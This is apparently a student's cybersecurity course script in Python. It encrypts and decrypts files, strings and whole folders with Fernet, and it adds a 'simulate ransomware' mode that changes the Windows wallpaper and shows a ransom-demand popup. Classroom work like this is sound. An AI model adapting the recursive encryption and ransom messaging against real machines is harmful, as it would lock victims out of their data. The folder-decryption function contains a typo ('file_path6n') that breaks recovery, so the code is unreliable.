# Script Name:                  Ops 401d8 Challenge 08
# Author:                       David Prutch
# Date of latest revision:      07/19/2023
# Purpose:                      Adding the following feature capabilities to script ops_407_File_Encryption_Script_Part_2.py:
                                # Alter the desktop wallpaper on a Windows PC with a ransomware message
                                # Create a popup window on a Windows PC with a ransomware message

# Import Libraries
from cryptography.fernet import Fernet
import os
from tkinter import Tk, messagebox
import ctypes

# Define Variables
# initialize var to end loop
continue_loop = True

# Define Functions
# Function to check for and retrieve the encryption key
def get_or_generate_key():
    key_file = 'key.key'
    key = None

    if os.path.exists(key_file):
        # Read key from file
        with open(key_file, 'rb') as file:
            key = file.read()
    else:
        # Generate new key and save it to file
        key = Fernet.generate_key()
        with open(key_file, 'wb') as file:
            file.write(key)

    return key

# Function to encrypt a file
def encrypt_file(file_path):
     # Get or generate encryption key
    key = get_or_generate_key()
    # Create Fernet cipher suite using the key
    cipher_suite = Fernet(key)

    # Read the file contents
    with open(file_path, 'rb') as file:
        file_data = file.read()

    # Encrypt the file data
    encrypted_data = cipher_suite.encrypt(file_data)

    # Write the encrypted data back to the file
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

# Function to decrypt a file
def decrypt_file(file_path):
    # Get or generate encryption key
    key = get_or_generate_key()
    # Create Fernet cipher suite using the key
    cipher_suite = Fernet(key)

    # Read the encrypted file contents
    with open(file_path, 'rb') as file:
        encrypted_data = file.read()

    # Decrypt the file data
    decrypted_data = cipher_suite.decrypt(encrypted_data)

    # Write the decrypted data back to the file
    with open(file_path, 'wb') as file:
        file.write(decrypted_data)

# Function to encrypt a string
def encrypt_string(plaintext):
    # Get or generate encryption key
    key = get_or_generate_key()
    # Create Fernet cipher suite using the key
    cipher_suite = Fernet(key)

    # Encrypt the plaintext string
    ciphertext = cipher_suite.encrypt(plaintext.encode())

    # Print the encrypted ciphertext
    print("Encrypted string:")
    print(ciphertext.decode())

# Function to decrypt a string
def decrypt_string(ciphertext):
    # Get or generate encryption key
    key = get_or_generate_key()
    # Create Fernet cipher suite using the key
    cipher_suite = Fernet(key)

    # Decrypt the ciphertext string
    decrypted_data = cipher_suite.decrypt(ciphertext.encode())

    # Print the decrypted plaintext
    print("Decrypted string:")
    print(decrypted_data.decode())

# Function to recursively encrypt files in a folder and its subfolders
def recursively_encrypt_folder(folder_path):
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path)

# Function to recursively decrypt files in a folder and its subfolders
def recursively_decrypt_folder(folder_path):
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            decrypt_file(file_path6n)

# Function to simulate ransomware on Windows PC
def simulate_ransomware():
    # Change desktop wallpaper
    SPI_SETDESKWALLPAPER = 20
    wallpaper_path = "https://www.logicmanager.com/wp-content/uploads/2021/10/BlogLP-BEWARE-Ransomware-eBook-800x382.png"
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, wallpaper_path, 3)

    # Create a popup window with ransomware message
    root = Tk()
    root.withdraw()
    messagebox.showerror("Ransomware Attack", "Your files are encrypted!\nPay the ransom to get the decryption key.")
    root.destroy()

# Main 

# Begin Loop
while continue_loop == True: 
    # Display mode selection options
    print("Select a mode:")
    print("1. Encrypt a file")
    print("2. Decrypt a file")
    print("3. Encrypt a message")
    print("4. Decrypt a message")
    print("5. Recursively encrypt a folder")
    print("6. Recursively decrypt a folder")
    print("7. Simulate Ransomware Attack (Windows only)")

    # Prompt user for mode selection
    mode = int(input("Enter the mode number: "))

    # Process user selection
    if mode == 1 or mode == 2:
        file_path = input("Enter the file path: ")

        if mode == 1:
            # Encrypt the file
            encrypt_file(file_path)
            print("File encrypted successfully.")
        else:
            # Decrypt the file
            decrypt_file(file_path)
            print("File decrypted successfully.")
    elif mode == 3 or mode == 4:
        text = input("Enter the text: ")

        if mode == 3:
            # Encrypt the string
            encrypt_string(text)
        else:
            # Decrypt the string
            decrypt_string(text)
    elif mode == 5 or mode == 6:
        folder_path = input("Enter the folder path: ")
        key = get_or_generate_key()

        if mode == 5:
            recursively_encrypt_folder(folder_path)
            print("Folder recursively encrypted successfully.")
        else:
            recursively_decrypt_folder(folder_path)
            print("Folder recursively decrypted successfully.")
    elif mode == 7:
        simulate_ransomware()
        print("Ransomware simulation completed.")
    else:
        print("Invalid mode selection. Please choose a valid mode.")

    # Prompt user for continue request
    ans = input("Do you wish to continue(y/n): ")
    if ans.lower() == "n":
        continue_loop = False
# End